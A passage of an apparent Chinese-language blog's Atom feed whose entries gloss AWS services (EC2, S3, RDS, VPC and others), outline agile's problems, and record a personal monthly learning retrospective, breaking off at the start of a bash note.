&lt;h2 id=&quot;ECR-EC2-Container-Registry&quot;&gt;&lt;a href=&quot;#ECR-EC2-Container-Registry&quot; class=&quot;headerlink&quot; title=&quot;ECR (EC2 Container Registry)&quot;&gt;&lt;/a&gt;ECR (EC2 Container Registry)&lt;/h2&gt;&lt;p&gt;作为Container的一个支持，用于储存和管理Docker images,使开发者更容易储存，管理，不熟Docker Conatainer Images.&lt;/p&gt;
&lt;h2 id=&quot;ECS-（EC2-Container-Service）&quot;&gt;&lt;a href=&quot;#ECS-（EC2-Container-Service）&quot; class=&quot;headerlink&quot; title=&quot;ECS （EC2 Container Service）&quot;&gt;&lt;/a&gt;ECS （EC2 Container Service）&lt;/h2&gt;&lt;p&gt;提供一个高可用，高可扩展的，快速的Container Management Service,让EC2中启动，停止和管理Docker Coantanier 簇更容易。&lt;/p&gt;
&lt;h2 id=&quot;EB-Elastic-Beanstalk&quot;&gt;&lt;a href=&quot;#EB-Elastic-Beanstalk&quot; class=&quot;headerlink&quot; title=&quot;EB (Elastic Beanstalk)&quot;&gt;&lt;/a&gt;EB (Elastic Beanstalk)&lt;/h2&gt;&lt;p&gt;快速部署和管理applications，而不用操心环境问题。帮你handle环境配置，负载均衡，自动扩容，和监控。 &lt;/p&gt;
&lt;h2 id=&quot;Lambda&quot;&gt;&lt;a href=&quot;#Lambda&quot; class=&quot;headerlink&quot; title=&quot;Lambda&quot;&gt;&lt;/a&gt;Lambda&lt;/h2&gt;&lt;p&gt;Serverless资源，可以直接在Amazon上运行函数级别的应用。作为Web的后台，AWS在一个Region下不同zones来保证高可用。&lt;/p&gt;
&lt;h2 id=&quot;Auto-Scaling&quot;&gt;&lt;a href=&quot;#Auto-Scaling&quot; class=&quot;headerlink&quot; title=&quot;Auto Scaling&quot;&gt;&lt;/a&gt;Auto Scaling&lt;/h2&gt;&lt;p&gt;EC2下的一个子服务，可根据需求自动终止或启动EC2 instances.&lt;/p&gt;
&lt;h2 id=&quot;ELB-Elastic-Load-Balancing&quot;&gt;&lt;a href=&quot;#ELB-Elastic-Load-Balancing&quot; class=&quot;headerlink&quot; title=&quot;ELB (Elastic Load Balancing)&quot;&gt;&lt;/a&gt;ELB (Elastic Load Balancing)&lt;/h2&gt;&lt;p&gt;负载均衡器&lt;/p&gt;
&lt;h2 id=&quot;VPC-（Vitual-Private-Cloud）&quot;&gt;&lt;a href=&quot;#VPC-（Vitual-Private-Cloud）&quot; class=&quot;headerlink&quot; title=&quot;VPC （Vitual Private Cloud）&quot;&gt;&lt;/a&gt;VPC （Vitual Private Cloud）&lt;/h2&gt;&lt;p&gt;虚拟云上网络，和本地网络环境相似，可以互通。&lt;/p&gt;
&lt;h1 id=&quot;存储功能&quot;&gt;&lt;a href=&quot;#存储功能&quot; class=&quot;headerlink&quot; title=&quot;存储功能&quot;&gt;&lt;/a&gt;存储功能&lt;/h1&gt;&lt;h2 id=&quot;S3-Simple-Storage-Service&quot;&gt;&lt;a href=&quot;#S3-Simple-Storage-Service&quot; class=&quot;headerlink&quot; title=&quot;S3 (Simple Storage Service)&quot;&gt;&lt;/a&gt;S3 (Simple Storage Service)&lt;/h2&gt;&lt;p&gt;亚马逊最重要的存储功能,可存储任何文件，并生成资源定位符供外部访问，附带保存log，备份，保存/转移镜像等功能。&lt;/p&gt;
&lt;h2 id=&quot;Glacier&quot;&gt;&lt;a href=&quot;#Glacier&quot; class=&quot;headerlink&quot; title=&quot;Glacier&quot;&gt;&lt;/a&gt;Glacier&lt;/h2&gt;&lt;p&gt;廉价存储长期不用访问的文件&lt;/p&gt;
&lt;h2 id=&quot;Amazon-CloudFront&quot;&gt;&lt;a href=&quot;#Amazon-CloudFront&quot; class=&quot;headerlink&quot; title=&quot;Amazon CloudFront&quot;&gt;&lt;/a&gt;Amazon CloudFront&lt;/h2&gt;&lt;p&gt;CDN(Content Delivery Network)内容分发网络&lt;/p&gt;
&lt;h2 id=&quot;EBS-Elastic-Block-Store&quot;&gt;&lt;a href=&quot;#EBS-Elastic-Block-Store&quot; class=&quot;headerlink&quot; title=&quot;EBS (Elastic Block Store)&quot;&gt;&lt;/a&gt;EBS (Elastic Block Store)&lt;/h2&gt;&lt;p&gt;与硬盘相似的存储服务，可以挂载在EC2 instance上。&lt;/p&gt;
&lt;h2 id=&quot;EFS-（Elatic-File-System）&quot;&gt;&lt;a href=&quot;#EFS-（Elatic-File-System）&quot; class=&quot;headerlink&quot; title=&quot;EFS （Elatic File System）&quot;&gt;&lt;/a&gt;EFS （Elatic File System）&lt;/h2&gt;&lt;p&gt;用于EC2之间文件的共享的文件系统&lt;/p&gt;
&lt;h2 id=&quot;Snowball&quot;&gt;&lt;a href=&quot;#Snowball&quot; class=&quot;headerlink&quot; title=&quot;Snowball&quot;&gt;&lt;/a&gt;Snowball&lt;/h2&gt;&lt;p&gt;大文件转移的方式（线下）&lt;/p&gt;
&lt;h2 id=&quot;Amazon-Storage-Gateway&quot;&gt;&lt;a href=&quot;#Amazon-Storage-Gateway&quot; class=&quot;headerlink&quot; title=&quot;Amazon Storage Gateway&quot;&gt;&lt;/a&gt;Amazon Storage Gateway&lt;/h2&gt;&lt;p&gt;数据转移方案，分为全云存储/备份，以及本地存储/云备份，以及廉价的磁带存储。&lt;/p&gt;
&lt;h1 id=&quot;Database&quot;&gt;&lt;a href=&quot;#Database&quot; class=&quot;headerlink&quot; title=&quot;Database&quot;&gt;&lt;/a&gt;Database&lt;/h1&gt;&lt;h2 id=&quot;RDS-Relational-Datebase-Server&quot;&gt;&lt;a href=&quot;#RDS-Relational-Datebase-Server&quot; class=&quot;headerlink&quot; title=&quot;RDS (Relational Datebase Server)&quot;&gt;&lt;/a&gt;RDS (Relational Datebase Server)&lt;/h2&gt;&lt;p&gt;管理关系型数据库，包含创建，运维，自动扩展。数据库有MySQL,MariaDB,PostgreSQL,Orcale,SQL Server.&lt;/p&gt;
&lt;h2 id=&quot;AWS-Schema-Conversion-Tool&quot;&gt;&lt;a href=&quot;#AWS-Schema-Conversion-Tool&quot; class=&quot;headerlink&quot; title=&quot;AWS Schema Conversion Tool&quot;&gt;&lt;/a&gt;AWS Schema Conversion Tool&lt;/h2&gt;&lt;p&gt;用于自动化不同类型数据库之间的数据迁移&lt;/p&gt;
&lt;h2 id=&quot;DynamoDB&quot;&gt;&lt;a href=&quot;#DynamoDB&quot; class=&quot;headerlink&quot; title=&quot;DynamoDB&quot;&gt;&lt;/a&gt;DynamoDB&lt;/h2&gt;&lt;p&gt;一种非关系型数据库，Amazon给你提供备份，监控，管理。目前支持Java, .NET,NodeJS,PHP,Python,Ruby.&lt;/p&gt;
&lt;h2 id=&quot;ElastiCache&quot;&gt;&lt;a href=&quot;#ElastiCache&quot; class=&quot;headerlink&quot; title=&quot;ElastiCache&quot;&gt;&lt;/a&gt;ElastiCache&lt;/h2&gt;&lt;p&gt;快速启动，管理，伸缩，分布式内存高速缓存。有Redis和Memcached两种。&lt;/p&gt;
&lt;h2 id=&quot;Redshift&quot;&gt;&lt;a href=&quot;#Redshift&quot; class=&quot;headerlink&quot; title=&quot;Redshift&quot;&gt;&lt;/a&gt;Redshift&lt;/h2&gt;&lt;p&gt;大数据存储仓库&lt;/p&gt;
&lt;h2 id=&quot;DMS-（Managed-DataBase-Migration-Service）&quot;&gt;&lt;a href=&quot;#DMS-（Managed-DataBase-Migration-Service）&quot; class=&quot;headerlink&quot; title=&quot;DMS （Managed DataBase Migration Service）&quot;&gt;&lt;/a&gt;DMS （Managed DataBase Migration Service）&lt;/h2&gt;&lt;p&gt;用于将数据从本地数据库导入RDS或从EC2导到RDS&lt;/p&gt;
&lt;h1 id=&quot;NetWork&quot;&gt;&lt;a href=&quot;#NetWork&quot; class=&quot;headerlink&quot; title=&quot;NetWork&quot;&gt;&lt;/a&gt;NetWork&lt;/h1&gt;&lt;h2 id=&quot;VPC-Virtual-Private-Cloud&quot;&gt;&lt;a href=&quot;#VPC-Virtual-Private-Cloud&quot; class=&quot;headerlink&quot; title=&quot;VPC (Virtual Private Cloud)&quot;&gt;&lt;/a&gt;VPC (Virtual Private Cloud)&lt;/h2&gt;&lt;p&gt;让你可以云上加载资源的一个虚拟网络，这个网络酷似你在本地的网络环境，但是使用它的好处在于你可以随时扩展你的基础设施&lt;/p&gt;
&lt;h2 id=&quot;Direct-Connect&quot;&gt;&lt;a href=&quot;#Direct-Connect&quot; class=&quot;headerlink&quot; title=&quot;Direct Connect&quot;&gt;&lt;/a&gt;Direct Connect&lt;/h2&gt;&lt;p&gt;在你的私有数据中心和AWS间建立专用直连&lt;/p&gt;
&lt;h2 id=&quot;Elastic-Load-Balancing&quot;&gt;&lt;a href=&quot;#Elastic-Load-Balancing&quot; class=&quot;headerlink&quot; title=&quot;Elastic Load Balancing&quot;&gt;&lt;/a&gt;Elastic Load Balancing&lt;/h2&gt;&lt;p&gt;负载均衡&lt;/p&gt;
&lt;h2 id=&quot;Route-53&quot;&gt;&lt;a href=&quot;#Route-53&quot; class=&quot;headerlink&quot; title=&quot;Route 53&quot;&gt;&lt;/a&gt;Route 53&lt;/h2&gt;&lt;p&gt;DNS服务&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;计算资源-Compute&quot;&gt;&lt;a href=&quot;#计算资源-Compute&quot; class=&quot;headerlink&quot; title=&quot;计算资源(Compute)&quot;&gt;&lt;/a&gt;计算资源(Compute)&lt;/h1&gt;&lt;h2 id=&quot;EC2（Elastic-Cloud-Compute）&quot;&gt;&lt;a href=&quot;#EC2（Elastic-Cloud-Compute）&quot; class=&quot;headerlink&quot; title=&quot;EC2（Elastic Cloud Compute）&quot;&gt;&lt;/a&gt;EC2（Elastic Cloud Compute）&lt;/h2&gt;&lt;p&gt;提供可扩展计算资源，可以在此基础上创建操作系统，分为可根据需求选择容量，大小，计算能力。&lt;br&gt;
    
    </summary>
    
    
      <category term="AWS" scheme="http://adu.404nf.cn/tags/AWS/"/>
    
  </entry>
  
  <entry>
    <title>AWS_EC2</title>
    <link href="http://adu.404nf.cn/2016/09/28/AWS-EC2/"/>
    <id>http://adu.404nf.cn/2016/09/28/AWS-EC2/</id>
    <published>2016-09-28T06:53:34.000Z</published>
    <updated>2016-11-02T03:18:26.000Z</updated>
    
    <content type="html">&lt;h1 id=&quot;AWS-EC2是啥？&quot;&gt;&lt;a href=&quot;#AWS-EC2是啥？&quot; class=&quot;headerlink&quot; title=&quot;AWS EC2是啥？&quot;&gt;&lt;/a&gt;AWS EC2是啥？&lt;/h1&gt;&lt;p&gt;Amazon Elastic Compulte Cloud(EC2)提供了可伸缩的计算资源，使你可以快速开发/部署你的应用，有了它你可以快速起一个应用，配置安全，网络，以及存储。他可以更灵活，更快地适应你对需求。&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h2 id=&quot;EC2定义了以下规则&quot;&gt;&lt;a href=&quot;#EC2定义了以下规则&quot; class=&quot;headerlink&quot; title=&quot;EC2定义了以下规则&quot;&gt;&lt;/a&gt;EC2定义了以下规则&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Instance:&lt;/strong&gt; 虚拟计算环境&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;AMI(Amazon Machine Images):&lt;/strong&gt; EC2环境的一个预配置&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Instance type:&lt;/strong&gt; instance的存储，CPU，内存，存储，网络，地位 &lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Key pair:&lt;/strong&gt; 用于安全登录你的instance（Amazon保存piublic key,你需要小心保存自己那份private key）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Instance store volumes:&lt;/strong&gt; 临时存储数据，当你stop或者terminate你的机器的时候就会被删除&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;EBS(Amazon Elastic Block Store)&lt;/strong&gt; 长期存储volume的数据&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Regions AZ&lt;/strong&gt; 给你的资源多个物理地址&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Security Group&lt;/strong&gt; 防火墙，用于定义通信策略，端口，可通信网段&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Tags&lt;/strong&gt; 元数据（metadata）可以与资源绑定&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;(VPCs)virtual private clouds&lt;/strong&gt; 虚拟网络，你可以配置用于和你自己的网络通信&lt;/p&gt;
&lt;p&gt;AWS提倡的是低费用，只为你用到的服务买单，可伸缩，可测量，帮助你快速将资源和需求对应起来，灵活地run你的软件，让你可以将你的想法更快地实施到市场。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;学习AWS-EC2总共分几步：&quot;&gt;&lt;a href=&quot;#学习AWS-EC2总共分几步：&quot; class=&quot;headerlink&quot; title=&quot;学习AWS EC2总共分几步：&quot;&gt;&lt;/a&gt;学习AWS EC2总共分几步：&lt;/h2&gt;&lt;h3 id=&quot;basics&quot;&gt;&lt;a href=&quot;#basics&quot; class=&quot;headerlink&quot; title=&quot;basics&quot;&gt;&lt;/a&gt;basics&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Instance and AMIs&lt;/li&gt;
&lt;li&gt;Regions and Availablity Zones&lt;/li&gt;
&lt;li&gt;Instance Types&lt;/li&gt;
&lt;li&gt;Tags&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;Networking-and-Security&quot;&gt;&lt;a href=&quot;#Networking-and-Security&quot; class=&quot;headerlink&quot; title=&quot;Networking and Security&quot;&gt;&lt;/a&gt;Networking and Security&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Amazon EC2 Key Pairs&lt;/li&gt;
&lt;li&gt;Security Groups&lt;/li&gt;
&lt;li&gt;Elastic IP Addresses&lt;/li&gt;
&lt;li&gt;Amazon EC2 and Amazon VPC&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;Storage&quot;&gt;&lt;a href=&quot;#Storage&quot; class=&quot;headerlink&quot; title=&quot;Storage&quot;&gt;&lt;/a&gt;Storage&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Amazon EBS&lt;/li&gt;
&lt;li&gt;Instance Store&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;和EC2有关的服务&quot;&gt;&lt;a href=&quot;#和EC2有关的服务&quot; class=&quot;headerlink&quot; title=&quot;和EC2有关的服务&quot;&gt;&lt;/a&gt;和EC2有关的服务&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;ELB（Elastic Load Balancing）&lt;/strong&gt; 在不同的instance之间自动分发进来的请求&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;CloudWatch&lt;/strong&gt; 实现监视器功能用于监控你的instance&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;CouldTrail&lt;/strong&gt; 监控所有通向EC2的call，包括AWS console commandline tools以及其他服务&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;如何操作EC2资源&quot;&gt;&lt;a href=&quot;#如何操作EC2资源&quot; class=&quot;headerlink&quot; title=&quot;如何操作EC2资源&quot;&gt;&lt;/a&gt;如何操作EC2资源&lt;/h2&gt;&lt;p&gt;&lt;code&gt;CLI&lt;/code&gt; &lt;code&gt;PowerShell 工具&lt;/code&gt;&lt;br&gt;AWS提供接口为HTTP或者HTTPs的请求提供响应。可以在 &lt;code&gt;Amazon EC2 API Reference&lt;/code&gt;里面设置响应（Action）&lt;br&gt;如果你想使用语言接入，AWS也提供SDK工具&lt;/p&gt;
&lt;h2 id=&quot;付费方式&quot;&gt;&lt;a href=&quot;#付费方式&quot; class=&quot;headerlink&quot; title=&quot;付费方式&quot;&gt;&lt;/a&gt;付费方式&lt;/h2&gt;&lt;p&gt;可以按小时付费（大部分时候我们采用这种方式），也可以先预付一笔钱，然后保留一到三年，这样会比较便宜一些。还有竞价方式，这个不需要太了解。&lt;/p&gt;
&lt;h2 id=&quot;Security-Best-Practice&quot;&gt;&lt;a href=&quot;#Security-Best-Practice&quot; class=&quot;headerlink&quot; title=&quot;Security Best Practice&quot;&gt;&lt;/a&gt;Security Best Practice&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;使用IAM(AWS Identity and Access Management)控制AWS资源的访问权限&lt;/li&gt;
&lt;li&gt;设置Security Group用于仅允许信任的设备接入开放的端口&lt;/li&gt;
&lt;li&gt;经常review你的Security Group设置，确保你赋予了“最小可用权限”，为不同的网络需求创建不同的SG&lt;/li&gt;
&lt;li&gt;禁止密码登录&lt;/li&gt;
&lt;/ul&gt;
</content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;AWS-EC2是啥？&quot;&gt;&lt;a href=&quot;#AWS-EC2是啥？&quot; class=&quot;headerlink&quot; title=&quot;AWS EC2是啥？&quot;&gt;&lt;/a&gt;AWS EC2是啥？&lt;/h1&gt;&lt;p&gt;Amazon Elastic Compulte Cloud(EC2)提供了可伸缩的计算资源，使你可以快速开发/部署你的应用，有了它你可以快速起一个应用，配置安全，网络，以及存储。他可以更灵活，更快地适应你对需求。&lt;/p&gt;
    
    </summary>
    
    
      <category term="aws" scheme="http://adu.404nf.cn/tags/aws/"/>
    
  </entry>
  
  <entry>
    <title>扒一扒敏捷的bug</title>
    <link href="http://adu.404nf.cn/2016/09/09/%E6%89%92%E4%B8%80%E6%89%92%E6%95%8F%E6%8D%B7%E7%9A%84bug/"/>
    <id>http://adu.404nf.cn/2016/09/09/扒一扒敏捷的bug/</id>
    <published>2016-09-08T23:51:55.000Z</published>
    <updated>2016-09-12T03:14:42.000Z</updated>
    
    <content type="html">&lt;h1 id=&quot;为什么要写这篇博客&quot;&gt;&lt;a href=&quot;#为什么要写这篇博客&quot; class=&quot;headerlink&quot; title=&quot;为什么要写这篇博客&quot;&gt;&lt;/a&gt;为什么要写这篇博客&lt;/h1&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h1 id=&quot;敏捷产生的原因即背景&quot;&gt;&lt;a href=&quot;#敏捷产生的原因即背景&quot; class=&quot;headerlink&quot; title=&quot;敏捷产生的原因即背景&quot;&gt;&lt;/a&gt;敏捷产生的原因即背景&lt;/h1&gt;&lt;h1 id=&quot;敏捷提倡的&quot;&gt;&lt;a href=&quot;#敏捷提倡的&quot; class=&quot;headerlink&quot; title=&quot;敏捷提倡的&quot;&gt;&lt;/a&gt;敏捷提倡的&lt;/h1&gt;&lt;h1 id=&quot;敏捷的带来的问题&quot;&gt;&lt;a href=&quot;#敏捷的带来的问题&quot; class=&quot;headerlink&quot; title=&quot;敏捷的带来的问题&quot;&gt;&lt;/a&gt;敏捷的带来的问题&lt;/h1&gt;&lt;h2 id=&quot;对于人数很多，层级很多的公司，多个小功能团队之间如何沟通？&quot;&gt;&lt;a href=&quot;#对于人数很多，层级很多的公司，多个小功能团队之间如何沟通？&quot; class=&quot;headerlink&quot; title=&quot;对于人数很多，层级很多的公司，多个小功能团队之间如何沟通？&quot;&gt;&lt;/a&gt;对于人数很多，层级很多的公司，多个小功能团队之间如何沟通？&lt;/h2&gt;&lt;h2 id=&quot;文档怎么管理&quot;&gt;&lt;a href=&quot;#文档怎么管理&quot; class=&quot;headerlink&quot; title=&quot;文档怎么管理&quot;&gt;&lt;/a&gt;文档怎么管理&lt;/h2&gt;</content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;为什么要写这篇博客&quot;&gt;&lt;a href=&quot;#为什么要写这篇博客&quot; class=&quot;headerlink&quot; title=&quot;为什么要写这篇博客&quot;&gt;&lt;/a&gt;为什么要写这篇博客&lt;/h1&gt;
    
    </summary>
    
    
      <category term="敏捷开发" scheme="http://adu.404nf.cn/tags/%E6%95%8F%E6%8D%B7%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>8月学习小计</title>
    <link href="http://adu.404nf.cn/2016/09/01/8%E6%9C%88%E5%AD%A6%E4%B9%A0%E5%B0%8F%E8%AE%A1/"/>
    <id>http://adu.404nf.cn/2016/09/01/8月学习小计/</id>
    <published>2016-09-01T11:27:38.000Z</published>
    <updated>2016-11-12T08:20:10.000Z</updated>
    
    <content type="html">&lt;h1 id=&quot;八月学习小计&quot;&gt;&lt;a href=&quot;#八月学习小计&quot; class=&quot;headerlink&quot; title=&quot;八月学习小计&quot;&gt;&lt;/a&gt;八月学习小计&lt;/h1&gt;&lt;p&gt;基本上讲，这两个月一直都在写文档，做PPT，提升所谓consultant能力。&lt;br&gt;除此之外比较系统地学习了shell和一些Linux有关的知识，自认为自身短板还是在技术上。&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;p&gt;个人觉得以下分析问题的方式还是比较面向过程和面向任务，比较适合团队retro，并不是很适合做自我总结。不过还是想试一下。&lt;/p&gt;
&lt;h2 id=&quot;内容回顾&quot;&gt;&lt;a href=&quot;#内容回顾&quot; class=&quot;headerlink&quot; title=&quot;内容回顾&quot;&gt;&lt;/a&gt;内容回顾&lt;/h2&gt;&lt;h3 id=&quot;Technique&quot;&gt;&lt;a href=&quot;#Technique&quot; class=&quot;headerlink&quot; title=&quot;Technique&quot;&gt;&lt;/a&gt;Technique&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Shell(Done)&lt;/li&gt;
&lt;li&gt;Linux(In porgress)&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;Commuity&quot;&gt;&lt;a href=&quot;#Commuity&quot; class=&quot;headerlink&quot; title=&quot;Commuity&quot;&gt;&lt;/a&gt;Commuity&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Shell Workshop(Done)&lt;/li&gt;
&lt;li&gt;搜集整理团队资料(In porgress)&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;LeaderShip&quot;&gt;&lt;a href=&quot;#LeaderShip&quot; class=&quot;headerlink&quot; title=&quot;LeaderShip&quot;&gt;&lt;/a&gt;LeaderShip&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;CAT release standard(In porgress)&lt;/li&gt;
&lt;li&gt;Take wish wall job&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;Workflow&quot;&gt;&lt;a href=&quot;#Workflow&quot; class=&quot;headerlink&quot; title=&quot;Workflow&quot;&gt;&lt;/a&gt;Workflow&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;confulunce&lt;/li&gt;
&lt;li&gt;Suncorp DevOps Onboarding Guilde(Done)&lt;/li&gt;
&lt;li&gt;看完了《持续交付》和《敏捷故事》&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;分析&quot;&gt;&lt;a href=&quot;#分析&quot; class=&quot;headerlink&quot; title=&quot;分析&quot;&gt;&lt;/a&gt;分析&lt;/h2&gt;&lt;p&gt;总的来说过去两个月值得记住的事太少了，唯一觉得有所收获的就是学了下shell，在每个维度上的学习都不够深入，主要还是精力太分散所致，DevOps确实有很多坑，比如说你不能像做开发一样专注于一件事，但好处是你可以从更宏观的角度来看一个项目，应该说做事情的节奏是可以自己调整的，能从整体架构的角度看问题还是比较令人兴奋的。但是，目前来说中心偏离了技术，就偏离我的意愿了。&lt;br&gt;其实还有比较困惑的点是自己思维方式的能力，思维方式肯定不是以多为好，我们总是会为一个新观点感到醍醐灌顶，但是总会有新的新观点让我们的思考被颠覆，但我们依然不能放弃追逐真理。。恩。&lt;br&gt;那些很牛逼的人，并不是脑子转的有多快，而是你问他的问题他以前就思考过了，甚至回答过别人了，甚至参考过别人的回答，甚至将自己的答案发表过，在网上和别人激烈的讨论过，所以当你刚刚开始思考这个问题的时候他已经有了比较自信也比较完整的答案。他不是比你聪明，只是走在了你前面。&lt;br&gt;那么如何成为一个比较聪明的人呢？&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;在别人遇到问题之前先发现问题&lt;/li&gt;
&lt;li&gt;反复咀嚼遇到过的问题&lt;/li&gt;
&lt;li&gt;记住你的解决方案，并帮助身边的人解决同样的问题 &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这样的成长轨迹很容易应用于技术领域，事实上一个程序员的成长很多就是按照这样的轨迹来的，但是如果把这个本领用于咨询，就变得困难了许多，因为描述问题本身就是一个问题，就跟早期的机器学习算法的建模一样，模型建的号，机器算法就优，技术领域的问题被封闭的语境限制着，所以能够有明确的答案，所以咨询的难点就变成了语境的建立和同一，比如“敏捷”，“精益”，一说这个语境，就好比技术上讲一个框架，这种方式适用于什么样的场景，有哪些优劣，一下就有了，我们在语境下的讨论就会变得有着落，明确，保证了沟通的效率。&lt;br&gt;回到学习能力建设的问题上来吧，虽然我们说没有一个确定的标准来构建你的知识体系，但是冥冥之中每个人都是有自己的standard的，比如说你至少认为人有理性和感性两个向量，比如说你认同三维比二维能更清楚地描述问题。&lt;br&gt;所以标准的建立有助于问题的分析和思考。&lt;/p&gt;
&lt;h3 id=&quot;Well&quot;&gt;&lt;a href=&quot;#Well&quot; class=&quot;headerlink&quot; title=&quot;Well&quot;&gt;&lt;/a&gt;Well&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;shell workshop做的还不错&lt;/li&gt;
&lt;li&gt;对Suncorp架构有了进一步认识&lt;/li&gt;
&lt;li&gt;对敏捷的工作方式更加熟悉了&lt;/li&gt;
&lt;li&gt;看问题的角度从一个开发提升到架构的层面&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;Lesswell&quot;&gt;&lt;a href=&quot;#Lesswell&quot; class=&quot;headerlink&quot; title=&quot;Lesswell&quot;&gt;&lt;/a&gt;Lesswell&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;太久不写代码，感觉都要生疏了&lt;/li&gt;
&lt;li&gt;一直在写document，做PPT，太烦了，感觉没有在做有价值的工作。&lt;/li&gt;
&lt;li&gt;思维方式和思考能力并没有提高，只是换了个看问题的的角度&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;Suggestion&quot;&gt;&lt;a href=&quot;#Suggestion&quot; class=&quot;headerlink&quot; title=&quot;Suggestion&quot;&gt;&lt;/a&gt;Suggestion&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;如果可能的话，希望多集中精力在技术上一点的成长&lt;/li&gt;
&lt;li&gt;希望自己的文档和思维方式更加结构化，可以在几种结构之间切换，但是得变得容易被人理解，容易传播，最好是发人深省&lt;/li&gt;
&lt;li&gt;多看书，看书，看书&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;Action&quot;&gt;&lt;a href=&quot;#Action&quot; class=&quot;headerlink&quot; title=&quot;Action&quot;&gt;&lt;/a&gt;Action&lt;/h2&gt;&lt;h3 id=&quot;Role-Map&quot;&gt;&lt;a href=&quot;#Role-Map&quot; class=&quot;headerlink&quot; title=&quot;Role-Map&quot;&gt;&lt;/a&gt;Role-Map&lt;/h3&gt;&lt;h3 id=&quot;Todo-list&quot;&gt;&lt;a href=&quot;#Todo-list&quot; class=&quot;headerlink&quot; title=&quot;Todo-list&quot;&gt;&lt;/a&gt;Todo-list&lt;/h3&gt;&lt;p&gt;下个月的学习计划主要是考取AWS认证，看几本书，以及尽快完成release standard&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;AWS认证： 多看几篇文档，希望能够产出几篇博客&lt;/li&gt;
&lt;li&gt;关于看书，主要是在TWI之前，希望能把手里的两本看完，产出session吧&lt;/li&gt;
&lt;li&gt;关于release standard，尽量在本周内完成&lt;/li&gt;
&lt;li&gt;git,Linux&lt;/li&gt;
&lt;li&gt;凤凰式部署&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;恩，差不多了&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;八月学习小计&quot;&gt;&lt;a href=&quot;#八月学习小计&quot; class=&quot;headerlink&quot; title=&quot;八月学习小计&quot;&gt;&lt;/a&gt;八月学习小计&lt;/h1&gt;&lt;p&gt;基本上讲，这两个月一直都在写文档，做PPT，提升所谓consultant能力。&lt;br&gt;除此之外比较系统地学习了shell和一些Linux有关的知识，自认为自身短板还是在技术上。&lt;/p&gt;
    
    </summary>
    
      <category term="study" scheme="http://adu.404nf.cn/categories/study/"/>
    
    
      <category term="小结" scheme="http://adu.404nf.cn/tags/%E5%B0%8F%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>bash学习小计</title>
    <link href="http://adu.404nf.cn/2016/08/05/bash%E5%AD%A6%E4%B9%A0%E5%B0%8F%E8%AE%A1/"/>
    <id>http://adu.404nf.cn/2016/08/05/bash学习小计/</id>
    <published>2016-08-05T00:09:15.000Z</published>
    <updated>2017-01-16T09:06:00.000Z</updated>
    
    <content type="html">&lt;p&gt;最近一段时间在学习bash，作为一个小总结，记录一些bash使用的技巧以及知识点。&lt;/p&gt;
